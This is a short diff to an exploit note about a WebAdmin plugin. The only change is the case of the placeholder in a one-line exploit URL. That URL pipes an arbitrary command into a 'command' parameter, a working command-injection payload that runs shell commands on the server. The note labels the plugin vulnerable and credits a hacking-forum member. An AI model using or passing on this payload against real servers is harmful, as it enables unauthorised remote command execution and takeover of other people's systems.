@@ -2,6 +2,6 @@
 
 - In plugins, if WebAdmin Plugin is installed. [VULNERABLE]
 
-Exploit: http://iP:PORT/webadmin/script?command=|YOUR_COMMAND
+Exploit: http://IP:PORT/webadmin/script?command=|YOUR_COMMAND
 
 Credits to: https://xss.is/members/242563/ (0x0021h)
